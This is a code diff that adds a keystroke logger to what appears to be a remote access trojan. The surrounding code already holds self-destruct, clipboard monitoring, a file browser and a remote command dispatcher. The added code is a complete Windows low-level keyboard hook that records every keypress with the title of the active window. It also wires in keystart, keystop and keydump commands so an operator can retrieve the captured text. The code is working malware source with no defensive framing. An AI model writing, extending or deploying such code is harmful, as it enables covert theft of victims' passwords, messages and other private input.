@@ -773,6 +773,229 @@ def self_destruct():
 
 
 # ============================================================
+#  Keystroke Logger (in-memory buffer only, never written to disk)
+# ============================================================
+import ctypes.wintypes as wintypes
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+
+_keylog_active = False
+_keylog_thread = None
+_keylog_hook = None          # keep the HOOKPROC reference alive (GC protection)
+_keylog_tid = 0              # hook thread id — used to post WM_QUIT on stop
+_keylog_lock = threading.Lock()
+_keylog_buffer = []          # list of text fragments; joined on dump
+_MAX_KEYLOG_CHARS = 100_000  # hard cap on retained keystrokes
+
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
+WM_SYSKEYDOWN = 0x0104
+WM_QUIT = 0x0012
+WM_KEYUP = 0x0101
+WM_SYSKEYUP = 0x0105
+
+VK_LSHIFT, VK_RSHIFT, VK_SHIFT = 0xA0, 0xA1, 0x10
+VK_LCTRL, VK_RCTRL, VK_CONTROL = 0xA2, 0xA3, 0x11
+VK_LMENU, VK_RMENU, VK_MENU = 0xA4, 0xA5, 0x12
+VK_LWIN, VK_RWIN = 0x5B, 0x5C
+VK_CAPITAL = 0x14
+
+
+class KBDLLHOOKSTRUCT(ctypes.Structure):
+    _fields_ = [
+        ("vkCode", wintypes.DWORD),
+        ("scanCode", wintypes.DWORD),
+        ("flags", wintypes.DWORD),
+        ("time", wintypes.DWORD),
+        ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG)),
+    ]
+
+
+# Low-level hook callback signature: LRESULT CALLBACK fn(int, WPARAM, LPARAM)
+_HOOKPROC = ctypes.WINFUNCTYPE(
+    ctypes.c_ssize_t, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM
+)
+
+# Explicit signatures — default windll restype (c_int) truncates 64-bit handles
+user32.SetWindowsHookExW.restype = ctypes.c_void_p
+user32.SetWindowsHookExW.argtypes = [ctypes.c_int, _HOOKPROC, ctypes.c_void_p, wintypes.DWORD]
+user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
+user32.CallNextHookEx.restype = ctypes.c_ssize_t
+user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
+user32.PostThreadMessageW.argtypes = [wintypes.DWORD, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
+kernel32.GetModuleHandleW.restype = ctypes.c_void_p
+kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
+kernel32.GetCurrentThreadId.restype = wintypes.DWORD
+
+# Keyboard translation APIs (HKL is pointer-sized — must not truncate)
+user32.GetKeyboardLayout.restype = ctypes.c_void_p
+user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
+user32.MapVirtualKeyExW.restype = wintypes.UINT
+user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, ctypes.c_void_p]
+user32.ToUnicodeEx.restype = ctypes.c_int
+user32.ToUnicodeEx.argtypes = [
+    wintypes.UINT, wintypes.UINT, ctypes.POINTER(ctypes.c_ubyte),
+    wintypes.LPWSTR, ctypes.c_int, wintypes.UINT, ctypes.c_void_p,
+]
+user32.GetAsyncKeyState.restype = ctypes.c_short
+user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
+user32.GetKeyState.restype = ctypes.c_short
+user32.GetKeyState.argtypes = [ctypes.c_int]
+
+_SPECIAL_VK_NAMES = {
+    0x08: "[BS]", 0x09: "[TAB]", 0x0D: "\n", 0x13: "",           # modifiers-only keys get ""
+    0x14: "[CAPS]", 0x1B: "[ESC]", 0x20: " ",
+    0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
+    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
+    0x2D: "[INS]", 0x2E: "[DEL]",
+    0x5B: "[WIN]", 0x5C: "[WIN]", 0x6A: "*", 0x6B: "+", 0x6D: "-", 0x6E: ".", 0x6F: "/",
+}
+for _i in range(0x70, 0x88):                                     # F1–F24
+    _SPECIAL_VK_NAMES[_i] = f"[F{_i - 0x6F}]"
+for _vk in (VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCTRL, VK_RCTRL,
+            VK_MENU, VK_LMENU, VK_RMENU, 0x90, 0x91):            # + NumLock/ScrollLock
+    _SPECIAL_VK_NAMES[_vk] = ""
+
+
+def _keylog_append(text):
+    with _keylog_lock:
+        _keylog_buffer.append(text)
+        total = sum(len(s) for s in _keylog_buffer)
+        while total > _MAX_KEYLOG_CHARS and len(_keylog_buffer) > 1:
+            total -= len(_keylog_buffer[0])
+            _keylog_buffer.pop(0)
+
+
+def _keylog_last_window():
+    """Foreground window title for context lines in the dump"""
+    try:
+        hwnd = user32.GetForegroundWindow()
+        buf = ctypes.create_unicode_buffer(256)
+        user32.GetWindowTextW(hwnd, buf, 256)
+        return buf.value.strip()
+    except Exception:
+        return ""
+
+
+def _keylog_translate(vk):
+    """Best-effort virtual-key → text. Returns None when the key is a bare modifier."""
+    if vk in _SPECIAL_VK_NAMES:
+        return _SPECIAL_VK_NAMES[vk]
+
+    try:
+        state = (ctypes.c_ubyte * 256)()
+        async_bits = 0
+        for mod_vk in (VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL):
+            if user32.GetAsyncKeyState(mod_vk) & 0x8000 or (
+                mod_vk == VK_CAPITAL and user32.GetKeyState(mod_vk) & 1
+            ):
+                async_bits |= mod_vk
+        state[VK_SHIFT] = 0x80 if async_bits & (VK_SHIFT | VK_LSHIFT | VK_RSHIFT) else 0
+        state[VK_CONTROL] = 0x80 if async_bits & (VK_CONTROL | VK_LCTRL | VK_RCTRL) else 0
+        state[VK_MENU] = 0x80 if async_bits & (VK_MENU | VK_LMENU | VK_RMENU) else 0
+        state[VK_CAPITAL] = 0x01 if user32.GetKeyState(VK_CAPITAL) & 1 else 0
+
+        hkl = user32.GetKeyboardLayout(0)
+        scan = user32.MapVirtualKeyExW(vk, 0, hkl)               # MAPVK_VK_TO_VSC
+        buf = ctypes.create_unicode_buffer(8)
+        n = user32.ToUnicodeEx(vk, scan, state, buf, 8, 0, hkl)
+        if n > 0:
+            return buf.value[:n]
+    except Exception as e:
+        global _keylog_last_error
+        _keylog_last_error = f"{type(e).__name__}: {e}"
+    return f"[VK:{vk:#04x}]"
+
+
+_keylog_last_error = ""
+_keylog_last_title = ""
+
+
+def _keylog_proc(nCode, wParam, lParam):
+    global _keylog_last_title
+    if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
+        try:
+            vk = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode
+            text = _keylog_translate(vk)
+            if text:
+                title = _keylog_last_window()
+                ctx_marker = f"\n[{title}]\n" if title and title != _keylog_last_title else ""
+                _keylog_last_title = title
+                if ctx_marker:
+                    _keylog_append(ctx_marker)
+                _keylog_append(text)
+        except Exception:
+            pass
+    return user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+
+_keylog_cb = _HOOKPROC(_keylog_proc)                             # keep callback alive
+
+
+def start_keylogger():
+    global _keylog_active, _keylog_thread, _keylog_tid
+    if _keylog_active:
+        return "[*] Keylogger already running"
+    with _keylog_lock:
+        _keylog_buffer.clear()
+
+    def pump():
+        global _keylog_tid, _keylog_hook
+        _keylog_tid = kernel32.GetCurrentThreadId()
+        _keylog_hook = user32.SetWindowsHookExW(
+            WH_KEYBOARD_LL, _keylog_cb, kernel32.GetModuleHandleW(None), 0
+        )
+        if not _keylog_hook:
+            err = kernel32.GetLastError()
+            _keylog_append(f"[!] Hook installation failed (error {err})\n")
+            return
+        msg = wintypes.MSG()
+        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
+            pass                                                 # message pump only
+
+    _keylog_active = True
+    _keylog_thread = threading.Thread(target=pump, daemon=True)
+    _keylog_thread.start()
+    return "[+] Keylogger started — 'keydump' retrieves captured keystrokes"
+
+
+def stop_keylogger(clear_buffer=True):
+    global _keylog_active, _keylog_hook
+    if not _keylog_active:
+        if clear_buffer:
+            with _keylog_lock:
+                _keylog_buffer.clear()
+        return "[*] Keylogger not running"
+    _keylog_active = False
+    try:
+        user32.PostThreadMessageW(_keylog_tid, WM_QUIT, 0, 0)
+    except Exception:
+        pass
+    _keylog_hook = None                                         # release hook handle
+    out = "[+] Keylogger stopped"
+    if clear_buffer:
+        with _keylog_lock:
+            _keylog_buffer.clear()
+        out += ", buffer cleared"
+    else:
+        out += " — 'keydump' still retrieves the captured buffer"
+    return out
+
+
+def dump_keystrokes():
+    with _keylog_lock:
+        chunks, _keylog_buffer[:] = _keylog_buffer[:], []
+    data = "".join(chunks).strip("\n")
+    if not data:
+        state = "running" if _keylog_active else "not running"
+        return f"[*] No keystrokes captured yet (keylogger {state})"
+    head = f"[KEYLOG DUMP — {len(data):,} chars, buffer cleared]"
+    tail = "\n[i] Buffer truncated" if len(data) > MAX_RESULT_BYTES else ""
+    return f"{head}\n{data[:MAX_RESULT_BYTES]}{tail}"
+
+
+# ============================================================
 #  Clipboard Functions
 # ============================================================
 _clipboard_monitor_active = False
@@ -1431,6 +1654,16 @@ def execute_command(cmd):
         elif cmd == "clipstop":
             stop_clipboard_monitor()
             return "[+] Clipboard monitor stopped"
+
+        # === Keylogger Commands ===
+        elif cmd == "keystart":
+            return start_keylogger()
+
+        elif cmd == "keystop":
+            return stop_keylogger(clear_buffer=False)
+
+        elif cmd == "keydump":
+            return dump_keystrokes()
 
         # === File Browser ===
         elif cmd == "ls" or cmd.startswith("ls "):
